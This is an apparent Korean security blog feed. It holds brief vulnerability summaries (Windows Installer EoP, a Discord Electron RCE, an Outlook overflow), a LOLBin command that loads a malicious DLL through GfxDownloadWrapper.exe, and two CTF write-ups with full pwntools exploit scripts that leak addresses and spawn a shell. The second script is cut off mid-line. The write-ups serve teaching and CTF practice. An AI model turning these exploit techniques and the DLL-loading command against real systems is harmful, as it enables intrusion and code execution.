<code>AppData</code> 상대 경로에 있는 게임 식별자 값</li></ul><pre><code class="hljs powershell">GfxDownloadWrapper.exe <span class="hljs-string">&quot;run&quot;</span> <span class="hljs-string">&quot;payload.dll&quot;</span> <span class="hljs-string">&quot;MethodNumber&quot;</span> <span class="hljs-string">&quot;;AppData\\Local\\Intel\\Games\\임의 값&quot;</span></code></pre><p>따라서 인자를 맞춰준 후 DLL 경로를 악성 dll로 지정하면 악성 어셈블리를 로드한 후 성공적으로 실행하게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>living of the land</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16902: Windows Installer EoP</title>
    <link href="/2020/10/21/fabu1ous/2020-10-21/"/>
    <url>/2020/10/21/fabu1ous/2020-10-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-windows-installer-elevation-of-privileges-vulnerability/">SSD Advisory – Windows Installer Elevation of Privileges Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Installer</p><p><strong>Affected Versions</strong></p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 10</li><li>Windows 2008</li><li>Windows 2012</li><li>Windows 2016</li><li>Windows 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSD Secure Disclosure program에 제보된 CVE-2020-16902입니다. Windows Installer는 소프트웨어의 설치, 관리, 제거에 사용되는 Windows 컴포넌트입니다. <code>SetSecurity()</code>의 race condition 문제로 인해 Windows installer는 패치와 패치 우회가 반복되고 있습니다. 지금 소개하는 CVE-2020-16902도 마찬가지입니다.</p><p>Windows Installer는 설치 스크립트를 실행하면서 두 가지 작업을 추가로 병행합니다. 설치 작업의 실패를 대비해 roll back script (<code>.RBS</code>)를 작성하고, 설치 작업 중 삭제되는 모든 파일들을 복제해 c:\Config.Msi에 저장합니다. <code>.RBS</code>를 작성하기 전에 특정 루틴을 거치는데, 아래와 같습니다.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> Config.Msi 속 임시파일들을 생성<span class="hljs-number">2.</span> Config.Msi 삭제<span class="hljs-number">3.</span> Config.Msi 존재 여부 확인<span class="hljs-number">4.</span> Config.Msi 생성</code></pre><p>3번 과정에서 Config.Msi 디렉토리가 여전히 존재한다면 <code>SetSecurity()</code>를 사용하는 코드가 실행되며 기존 취약점(CVE-2020-1302)이 그대로 다시 악용될 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>local</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>system privilege</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Discord Desktop app RCE</title>
    <link href="/2020/10/20/l0ch/Discord_RCE/"/>
    <url>/2020/10/20/l0ch/Discord_RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mksben.l0.cm/2020/10/discord-desktop-rce.html">Discord Desktop app RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Discord Desktop app</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>node.js 기반 오픈소스 프레임워크인 Electron으로 개발된 Discord에서 원격 코드 실행 취약점이 발견되었습니다. </p><p>Electron의 <code>BrowserWindow API</code> 옵션 중 코드 실행 컨텍스트를 분리하는 <code>contextIsolation</code> 옵션이 discord에서는 비활성화 돼있어 injection된 JS가 내부 페이지 코드 실행에 영향을 줄 수 있습니다. 이를 이용하면 iframe embed XSS 를 통해 JavaScript 내장 메소드를 재정의할 수 있으며 이때 Navigation restriction을 우회하면 iframe을 escape해 최상위 컨텍스트에서 임의 코드를 실행할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>javascript</tag>
      
      <tag>context isolation</tag>
      
      <tag>xss</tag>
      
      <tag>discord</tag>
      
      <tag>electron</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16947: Outlook 365 Remote Command Execution</title>
    <link href="/2020/10/19/idioth/cve-2020-16947/"/>
    <url>/2020/10/19/idioth/cve-2020-16947/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0neb1n/CVE-2020-16947">CVE-2020-16947</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Outlook 365 apps for Enterprise/2016/2019</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook 365에서 메모리 객체에 대한 처리를 잘못하여 RCE가 가능한 취약점이 발견되었습니다.</p><p>HTML 콘텐츠에서 ASCII 범위 밖의 문자열을 복사할 때 해당 문자열들은 <code>0xfffd</code>로 교체됩니다. 따라서 복사된 문자열의 크기가 2배가 되기 때문에 src 버퍼와 dst 버퍼의 크기가 같아도 버퍼 오버플로가 발생하게 됩니다.</p><p>현재 이 취약점에 대한 자세한 기술적 설명과 exploit은 공개되지 않았습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>outlook</tag>
      
      <tag>idioth</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>memory corruption</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF eat-the-pie</title>
    <link href="/2020/10/18/fabu1ous/sstf-eat-the-pie/"/>
    <url>/2020/10/18/fabu1ous/sstf-eat-the-pie/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>뉴비부터 고수까지 모두 즐길 수 있는 CTF라는 소개글을 보고 대학 동아리 신입생들을 데리고 SSTF에 출전했습니다. 아쉽게도 좋은 성적을 내진 못했네요. 사실 이 write-up은 같이 출전한 신입생 친구들에게 보여주려고 작성했는데 몇 명이나 읽었을지…</p><p>CTF를 처음 경험하는 친구들이라 최대한 풀어서 설명을 적었으며, CTF에 대한 저의 견해도 조금씩 섞여 있습니다. eat-the-pie를 풀 당시 저의 사고 흐름을 중심으로 작성했고 이 글을 읽으실 때도 이점을 기억해주세요.</p><p>[ 취약점 ]</p><ol><li><p>Memory Leak With Printf</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="훑어보기"><a href="#훑어보기" class="headerlink" title="훑어보기"></a>훑어보기</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image1.png"></p><p><code>pwnme()</code>라는 이름의 함수가 있다. <del>“동네 사람들!!! 취약점 여기 있어요!!!”</del></p><p>CTF에서 이렇게 취약점의 위치를 알려주는 문제들은 주로 취약점은 간단하지만 exploit으로 연결시키는 것이 어려운 컨셉의 문제들입니다. eat-the-pie도 이런 컨셉의 문제인 거 같죠?</p><p><del>[ ! ] 심지어 문제 이름도 PIE 우회를 암시하고 있다.</del></p><p>대충 eat-the-pie 문제를 설명하자면,</p><ol><li>stack에 vtable을 만들고 <code>read()</code>로 입력을 받음.</li><li><code>read()</code>로 받은 입력 값을 이용해 vtable로부터 함수를 참조 실행.</li></ol><p>이 두 가지 정도만 알면 되는 간단한 프로그램입니다.</p><p>CTF 문제들은 의도적으로 취약점을 만들어 놨기 때문에 짱구를 조금만 굴려 보면</p><p>코드에서 많은 힌트를 얻을 수 있습니다. </p><p>[ ! ] Real world와 대조되는 큰 차이점이다.</p><p>위 사진에서 하이라이트 된 부분을 보고 최대한 많은 정보를 알아내 봅시다.</p><h1 id="취약점-예상-정적-분석"><a href="#취약점-예상-정적-분석" class="headerlink" title="취약점 예상 ( 정적 분석 )"></a>취약점 예상 ( 정적 분석 )</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image2.png"></p><ol><li>입력을 굳이 int가 아닌 string형으로 16 byte나 받는다.</li></ol><p>int( 4 byte )가 아닌 string으로 16 byte나 입력받는 것은 12 byte만큼 메모리를 낭비하는 것이고 입력받은 string을 int로 바꾸는 과정을 한번 더 걸치니 결코 합리적인 코드가 아닙니다. 즉, 취약점으로 빌드 업 되도록 의도된 코드인 거 같죠? <code>atoi()</code> 혹은 <code>printf()</code> 등 NULL terminated string 함수를 사용한다는 것도 중요한 정보인 것 같습니다.</p><ol start="2"><li>if문의 조건이 모든 경우의 수를 커버하지 못함.</li></ol><p>index를 이용해 참조하는 코드가 있다면 가장 먼저 확인해야 할 것이 있습니다. 바로, out-of-bound 가능 여부. 코드를 살펴보면 음수에 대한 예외 처리를 하지 않은 것을 알 수 있습니다. 심지어 indirect call에 사용되는 index의 out-of-bound네요.</p><p>그럼 대충 예상해 보면 취약점은 아래와 같습니다.</p><ol><li>NULL terminated string의 예외 처리 부재로 PIE 우회</li><li>out-of-bound로 eip 제어</li></ol><p>예상이 맞는지 한번 확인해 봅시다.</p><h1 id="Memory-Leak-with-printf"><a href="#Memory-Leak-with-printf" class="headerlink" title="Memory Leak with printf"></a>Memory Leak with printf</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image3.png"></p><p>PIE를 우회하는 법은 간단합니다. binary의 base address를 leak 하면 되니까요.</p><p>예를 들어 func1의 주소인 <code>0x5655574d</code>를 leak 했다면 <code>0x5655574d</code>에서 <code>func1</code>의 offset인 <code>0x74d</code>를 빼서 binary base address를 구할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image4.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image5.png"></p><p>16 byte 길이의 string을 입력하면 vtable 바로 위에 저장되는 것을 확인할 수 있습니다. 이 상태로 <code>printf()</code> 실행을 트리거하면 <code>func1 ~ func4</code>의 주소도 같이 출력됩니다. <code>printf()</code>는 NULL terminated string을 다루는 함수이기 때문에 NULL을 만나기 전까진 멈추지 않고 계속 출력한 결과입니다.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image6.png"></p><p>Indirect call에 사용될 인덱스에 따라 스택 상황을 출력한 사진에 번호를 새겨봤습니다. 좀 전에 indirect call에서 음수에 대한 예외 처리를 하지 않아 out-of-bound가 가능하다고 설명했습니다. 만약 현 상황에서 -3을 입력한다면 eip에 <code>0x42424242</code> 가 들어가겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image7.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image8.png"></p><p>예상대로 취약점은 정말 간단합니다. 이제 exploit을 해봅시다.</p><h1 id="Exploit-Plan"><a href="#Exploit-Plan" class="headerlink" title="Exploit Plan"></a>Exploit Plan</h1><p>주어진 정보와 제약 상황 등을 고려하며 추가로 필요한 정보가 있는지 체크해봅시다.</p><ol><li><code>system()</code>을 바이너리에서 사용함.<ul><li>Arbitrary Write(AW)가 가능하다면 bss에 “/bin/sh”을 넣어주기만 하면 됨</li></ul></li><li>Libc 주소를 leak 하기 번거로움 </li><li>PIE가 있는 상황에서 stack 주소를 leak 하기 번거로움</li></ol><p>[ ! ] 결론</p><p>Arbitrary Write 할 방법을 찾자.</p><p>“/bin/sh”을 bss에 저장하고 <code>system( bss )</code>를 하면 쉘 획득 가능.</p><h1 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image9.png"></p><p>Arbitrary Write(Write anything anywhere)를 하려면 당연히 쓰기 함수가 있어야 하겠죠?. 사용 가능한 쓰기 함수는 <code>read()</code>가 유일합니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image10.png"></p><p>out-of-bound로 <code>read()</code>를 AW에 사용하려는 지금 상황에서 넘어야 할 장애물이 2가지가 있습니다.</p><ol><li>call로 eip를 잡는다는 점</li><li><code>read()</code>는 인자를 3개나 받는다는 점</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image11.png"></p><p>일단 첫 번째, call로 함수를 호출하기 전에 충족돼야 하는 조건이 있는데,</p><ol><li>호출당하는 함수가 쓸 인자들이 stack에 push 돼 있어야 함.</li><li>ESP가 그 인자들 중 가장 낮은 주소에 위치해야 함.</li></ol><p>적절한 gadget을 사용한다면 이 두 가지 조건을 충족하는 것은 대부분 크게 어려운 일이 아닙니다. 하지만 pyload를 담을 메모리가 16byte 밖에 없기 때문에 이마저도 어려운 일이 돼 버렸네요.</p><p>[ ! ] indexVar + gadget + parameter1 + parameter2 + parameter3 + &amp;read() = 24 byte</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image12.png"></p><p>한참 고민하다가 한 가지 생각이 머리를 스치고 갔습니다.</p><p>“32 bit의 인자 push는 역순으로 이뤄진다!” <del>이때 이마를 탁 치고 유레카를 외쳤습니다.</del></p><p>결론부터 적자면 위 사진에서 하이라이트 된 부분을 gadget으로 사용하면 됩니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image13.png"></p><p>위 사진은 <code>pwnme()</code>에서 <code>read(0, &amp;v0, 0x10)</code>에 해당하는 어셈 코드입니다. 3번째 인자부터 역순으로 stack에 push 하는 게 보이시나요? 만약 3번째 인자를 push 하는 코드를 건너뛰고 <code>&lt;pwnme+198&gt;</code>부터 실행된다면 <code>read()</code>가 호출될 때 stack에 있던 쓰레기 값( <del>사실 ret addr</del> )을 <code>read()</code>의 3번째 인자로 인식하게 됩니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image14.png"></p><p>테스트해보면 예상과 같이 <code>read(0, &amp;v0, 0x566109bc)</code>가 실행됩니다. 이 가젯을 사용한다면 16 byte 입력 제한으로 불가능했던 AW가 가능해집니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;eat-the-pie.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)read_plt = e.plt[<span class="hljs-string">&#x27;read&#x27;</span>]system = e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]bss = e.bss()<span class="hljs-comment"># leak binary base</span>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">12</span> + <span class="hljs-string">&#x27;BBBB&#x27;</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;BBBB&#x27;</span>)leak = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x74d</span>log.info(hex(leak))<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>) <span class="hljs-comment"># read() in pwnme() without len</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># arbitrary write to bss</span>payload = p32(<span class="hljs-number">0</span>) + p32(leak+bss) + p32(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(leak+read_plt)p.sendline(payload)p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># system(&quot;/bin/sh&quot;);</span>payload = <span class="hljs-string">&#x27;AAAABBBBCCCC&#x27;</span>+ p32(leak+system) + p32(leak+<span class="hljs-number">0xa99</span>) + p32(leak+bss)p.sendline(payload) <span class="hljs-comment"># 0xa99 == pop pop pop ret</span>p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image15.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>calling convention</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF T-express</title>
    <link href="/2020/10/18/fabu1ous/sstf-t-express/"/>
    <url>/2020/10/18/fabu1ous/sstf-t-express/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image.png"></p><p>삼성에서 주최한 SSTF에 출전했습니다. 조금 늦은 감이 있지만 T-express 문제 풀이를 해볼까 합니다. T-express 바이너리를 실행하면 에버랜드 로고의 아스키 아트로 저희를 맞이해줍니다. 코로나 때문에 어디 놀러 가지도 못하고 있었는데 온라인으로 에버랜드에 가보네요. ㅎㅎ </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image1.png"></p><p>T-express 바이너리는 glibc-2.31와 함께 주어진 Heap문제입니다. glibc-2.31는 2020년 2월에 릴리즈 된 버전인데,  저는 T-express를 풀면서 이 버전의 tcache를 처음 접해봤습니다. 이런 저조차 어렵지 않게 풀만큼 크게 어렵지 않고 재밌게 풀 수 있는 문제입니다.</p><p>[취약점]</p><ol><li><p>Off-By-One</p></li><li><p>Double-Free</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="훑어보기"><a href="#훑어보기" class="headerlink" title="훑어보기"></a>훑어보기</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image2.png"></p><p>프로그램의 기능은 대충 아래와 같이 요약할 수 있습니다.</p><ol><li><p>티켓 구매</p><ul><li>One Ride 티켓 → 메모리 할당</li><li>One Day 티켓 → 메모리 할당</li></ul></li><li><p>보유 중인 티켓 보기</p></li><li><p>티켓 사용</p><ul><li>One Ride 티켓 → 할당 해제</li><li>One Day 티켓 → 활동 선택 → 모든 활동 사용 → 할당 해제</li></ul></li><li><p>종료</p></li></ol><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image3.png"></p><p>구매할 수 있는 티켓의 종류는 두 가지로 나뉩니다(One Ride Ticket / One Day Ticket). 두 티켓은 3가지 차이점이 있습니다.</p><ol><li>할당 크기<ul><li>One Ride → 0x18</li><li>One Day → 0x30</li></ul></li><li>티켓 타입<ul><li>One Ride → 1</li><li>One Day → 0</li></ul></li><li>해제 조건</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image4.png"></p><p><code>0x55d222efe2a0</code> 에는 One Ride Ticket이, <code>0x55d222efe2c0</code> 에는 One Day Ticket이 할당돼있는 모습입니다. 하이라이트 된 부분을 보시면 <code>ticket_type</code>값이 저장된 것을 볼 수 있습니다.  여기서 집중해야 할 점은 <code>lastname</code> 바로 다음에 <code>ticket_type</code>이 존재한다는 것입니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image5.png"></p><p><code>lastname</code>은 티켓이 할당된 후 함수 <code>read_str()</code>으로 입력을 받습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image6.png"></p><p>함수 <code>read_str()</code>은 입력받은 string 끝에 NULL을 추가하는 루틴이 존재합니다. 만약 <code>lastname</code>에 입력받을 때 8byte를 꽉 채워 넣는다면 <code>ticket_type</code>의 값을 오염시킬 수 있겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image7.png"></p><p>One Ride Ticket의 <code>ticket_type</code>을 NULL(0x00)로 오염시킨 모습입니다. 그래서 이걸로 무얼 할 수 있느냐? <code>ticket_type</code>을 오염시켜 0으로 바꾸면 One Ride Ticket을 One Day Ticket인 것처럼 속일 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image8.png"></p><p>함수 <code>use_ticket()</code>의 일부입니다. <code>ticket_type</code>에 따라 분기문에서 실행되는 코드가 달라집니다. One Ride Ticket에는 존재하지 않는 <code>meal_ticket, safari_pass</code>등의 값을 조작하는 코드를 실행할 수 있고 이는 추가로 메모리 오염을 발생시킵니다.</p><h1 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h1><p>glibc-2.31 버전의 tcache는 double free를 검증하는 코드가 추가 됐습니다. 여기서 재밌는 점은 크기가 같은 tcache 끼리만 검증한다는 겁니다. 만약 청크의 size를 임의로 조작할 수 있는 방법이 있다면 같은 청크를 두 번 해제할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image9.png"></p><p>One Ride Ticket의 <code>ticket_type</code>을 <code>0x00</code>으로 바꿔 함수 <code>use_ticket()</code>에서 One Day Ticket인 것처럼 사용할 수 있다고 설명했습니다. 그중 <code>meal_ticket</code>을 사용하면 다음 청크의 size값을 오염시킬 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image10.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image11.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image12.png"></p><p>위에서 설명한 대로 size값을 오염시킨 모습입니다. One Day Ticket을 size가 0x41일 때 한번, 0x21일 때 한번 할당 해제를 해주면 Double Free가 되겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image13.png"></p><p>짠! 같은 주소가 두 번 해제됩니다. 이제 원하는 주소에 chunk를 할당해 Arbitrary Write를 할 수 있습니다.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image14.png"></p><p>구매한 티켓은 <code>passes</code>라는 이름의 배열로 bss영역에 저장됩니다. 각 티켓에 해당하는 chunk의 주소를 저장하고 index를 사용해 접근합니다. 위 사진은 함수 <code>view_ticket()</code>의 일부입니다. 자세히 보시면 index를 검사하는 분기문에서 음수에 대한 예외처리를 하지 않은 것을 확인할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image15.png"></p><p>만약 <code>passes</code> 보다 낮은 주소에 중요한 정보가 있다면 Out-Of-Bound로 출력시킬 수 있습니다. 그리고 배열 <code>passes</code>보다 조금 낮은 주소를 확인해 보면 <code>stderr@@GLIBC</code>가 있다는 걸 알 수 있습니다. </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image16.png"></p><p>함수 <code>view_ticket()</code>에 -4를 index로 입력한다면 <code>stderr@@GLIBC</code>를 통해 libc의 base address를 leak 할 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;t-express.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># init</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;AAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-comment"># leak libc</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;-4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;|name |    &#x27;</span>)pad = u64(p.recv(<span class="hljs-number">4</span>)+ <span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;   &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+ <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)libc_base = leak<span class="hljs-number">-0x1ec643</span>log.info(hex(libc_base))free_hook = libc_base + <span class="hljs-number">0x1eeb28</span>log.info(hex(free_hook))system = libc_base + <span class="hljs-number">0x55410</span>log.info(hex(system))<span class="hljs-comment"># double free</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>):p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span 